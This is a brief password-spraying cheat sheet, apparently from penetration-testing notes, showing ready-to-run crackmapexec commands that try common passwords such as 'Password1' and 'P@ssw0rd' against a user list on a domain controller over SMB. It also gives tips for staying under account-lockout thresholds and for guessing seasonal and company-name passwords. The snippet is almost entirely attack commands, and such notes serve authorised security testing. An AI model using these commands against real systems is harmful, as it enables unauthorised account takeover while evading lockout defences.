# NEVER spray more than lockout threshold - 1
# Usually 3-5 attempts per user is safe

# Test with most common passwords first
crackmapexec smb $DC -u users.txt -p 'Password1' --continue-on-success
crackmapexec smb $DC -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb $DC -u users.txt -p 'Welcome1' --continue-on-success
crackmapexec smb $DC -u users.txt -p 'P@ssw0rd' --continue-on-success

# Use season-based passwords
# e.g., Summer2024, Winter2024, Spring2024

# Use company name variations